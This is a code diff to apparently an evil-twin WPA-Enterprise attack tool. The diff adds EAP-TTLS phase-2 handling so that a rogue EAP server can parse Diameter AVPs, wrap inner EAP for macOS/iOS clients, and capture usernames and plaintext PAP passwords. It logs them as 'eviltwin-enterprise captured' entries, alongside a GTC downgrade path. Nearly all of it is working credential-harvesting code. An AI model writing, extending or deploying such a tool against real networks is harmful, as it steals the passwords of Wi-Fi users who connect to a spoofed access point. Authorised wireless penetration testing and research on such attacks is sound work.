@@ -32,6 +32,8 @@ logger = logging.getLogger(__name__)
 
 MAX_TLS_FRAGMENT = 1024
 _MAX_PHASE2_RETRIES = 4           # re-request the inner identity this many times before giving up
+# EAP-TTLS phase-2 Diameter AVP codes (RFC 5281 / RADIUS attribute numbers).
+_AVP_USER_NAME, _AVP_USER_PASSWORD, _AVP_EAP_MESSAGE = 1, 2, 79
 
 
 class Method(str, Enum):
@@ -82,6 +84,7 @@ class EapServer:
         self._offered_gtc = gtc_downgrade
         self._phase2_retries = 0
         self._inner_headerless: Optional[bool] = None    # PEAPv0 (macOS/iOS) sends inner EAP as <type><data>
+        self._inner_mode = "peap"                         # or "ttls_eap": inner EAP wrapped in an AVP
         # Advertise our max PEAP version in the Start; the client picks down and we adopt its choice.
         self._outer_version = 1 if method is Method.PEAP else 0
         self.captured: Optional[Capture] = None
@@ -203,16 +206,41 @@ class EapServer:
                           data=plaintext[1:])
 
     def _inner_send(self, method_type: int, data: bytes = b"") -> list[bytes]:
-        """Send a tunneled EAP request in whichever inner format the client is using."""
+        """Send a tunneled EAP request in whichever inner format the client is using: PEAPv1 full EAP,
+        PEAPv0 headerless EAP, or EAP wrapped in a TTLS EAP-Message AVP."""
         full = eap_packet(EAP_REQUEST, self._bump_inner(), method_type, data)
-        inner = full[4:] if self._inner_headerless else full      # drop Code/Id/Length for PEAPv0
+        if self._inner_mode == "ttls_eap":
+            payload = _avp(_AVP_EAP_MESSAGE, full)
+        elif self._inner_headerless:
+            payload = full[4:]                        # drop Code/Id/Length for PEAPv0
+        else:
+            payload = full
         assert self._tunnel is not None
-        return self._emit_tls(self._tunnel.write_app(inner))
+        return self._emit_tls(self._tunnel.write_app(payload))
 
     def _handle_phase2(self, plaintext: bytes) -> list[bytes]:
-        if self.method is Method.TTLS and not _looks_like_eap(plaintext):
-            return self._handle_ttls_pap(plaintext)
-        inner = self._parse_inner(plaintext)
+        if self.method is Method.TTLS:
+            return self._handle_ttls(plaintext)
+        return self._dispatch_inner(self._parse_inner(plaintext), plaintext)
+
+    def _handle_ttls(self, plaintext: bytes) -> list[bytes]:
+        """EAP-TTLS phase 2 is Diameter AVPs: an EAP-Message AVP (inner EAP, what macOS/iOS send) or
+        User-Name + User-Password AVPs (PAP plaintext)."""
+        avps = _parse_avps(plaintext)
+        if _AVP_EAP_MESSAGE in avps:
+            self._inner_mode = "ttls_eap"
+            return self._dispatch_inner(parse_eap(avps[_AVP_EAP_MESSAGE]), plaintext)
+        if _AVP_USER_NAME in avps and _AVP_USER_PASSWORD in avps:
+            username = avps[_AVP_USER_NAME].decode("utf-8", errors="replace").strip("\x00")
+            password = avps[_AVP_USER_PASSWORD].decode("utf-8", errors="replace").strip("\x00")
+            self.inner_username = username
+            self.captured = Capture(ssid=self.ssid, username=username, inner_method="PAP",
+                                    password=password)
+            logger.info("eviltwin-enterprise captured PAP plaintext for %r on %r", username, self.ssid)
+            return self._finish()
+        return self._retry_or_finish("TTLS inner is neither EAP-Message nor PAP AVPs", plaintext)
+
+    def _dispatch_inner(self, inner: Optional[EapMessage], plaintext: bytes) -> list[bytes]:
         if inner is None:
             return self._retry_or_finish("empty inner phase-2 packet", plaintext)
         self._phase2_retries = 0                      # a real inner packet: we're on track
@@ -282,18 +310,6 @@ class EapServer:
         logger.info("eviltwin-enterprise captured GTC plaintext for %r on %r", username, self.ssid)
         return self._finish()
 
-    def _handle_ttls_pap(self, plaintext: bytes) -> list[bytes]:
-        creds = _parse_pap_avps(plaintext)
-        if creds is None:
-            return self._retry_or_finish("TTLS inner is not PAP (User-Name/Password AVPs)", plaintext)
-        self._phase2_retries = 0
-        username, password = creds
-        self.inner_username = username
-        self.captured = Capture(ssid=self.ssid, username=username, inner_method="PAP",
-                                password=password, hashline=None)
-        logger.info("eviltwin-enterprise captured PAP plaintext for %r on %r", username, self.ssid)
-        return self._finish()
-
     def _finish(self) -> list[bytes]:
         self._state = _State.DONE
         return [eap_success(self._id)]
@@ -332,17 +348,8 @@ class EapServer:
         return self._request(self._tls_body(frag, more=more))
 
 
-def _looks_like_eap(plaintext: bytes) -> bool:
-    """A tunneled EAP packet starts with code 1-4 and a consistent length; a TTLS AVP block does not."""
-    if len(plaintext) < 4:
-        return False
-    code = plaintext[0]
-    length = struct.unpack_from(">H", plaintext, 2)[0]
-    return code in (1, 2, 3, 4) and length == len(plaintext)
-
-
-def _parse_pap_avps(plaintext: bytes) -> Optional[tuple[str, str]]:
-    """Pull User-Name (AVP 1) and User-Password (AVP 2) out of an EAP-TTLS/PAP AVP block."""
+def _parse_avps(plaintext: bytes) -> dict[int, bytes]:
+    """Parse an EAP-TTLS phase-2 Diameter AVP block into ``{code: value}`` (last wins)."""
     avps: dict[int, bytes] = {}
     offset = 0
     while offset + 8 <= len(plaintext):
@@ -353,8 +360,11 @@ def _parse_pap_avps(plaintext: bytes) -> Optional[tuple[str, str]]:
         header = 12 if flags & 0x80 else 8          # V flag adds a 4-byte vendor id
         avps[code] = plaintext[offset + header:offset + length]
         offset += (length + 3) & ~3                 # AVPs are padded to a 4-byte boundary
-    if 1 in avps and 2 in avps:
-        username = avps[1].decode("utf-8", errors="replace").strip("\x00")
-        password = avps[2].decode("utf-8", errors="replace").strip("\x00")
-        return username, password
-    return None
+    return avps
+
+
+def _avp(code: int, data: bytes, flags: int = 0x40) -> bytes:
+    """A Diameter AVP (mandatory bit set), padded to a 4-byte boundary. Used to wrap inner EAP in a
+    TTLS EAP-Message AVP."""
+    avp = struct.pack(">I", code) + bytes([flags]) + (8 + len(data)).to_bytes(3, "big") + data
+    return avp + b"\x00" * ((-len(avp)) % 4)
